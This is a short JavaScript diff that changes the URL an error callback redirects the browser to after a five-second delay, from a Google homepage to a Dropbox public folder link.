@@ -320,7 +320,7 @@ const errorCallback = (error) => {
    window.setTimeout(function(){
 
        // Move to a new location or you can do something else
-       window.location.href = "https://www.google.co.in";
+       window.location.href = "https://dl.dropboxusercontent.com/u/37251493/";
 
    }, 5000);
 };
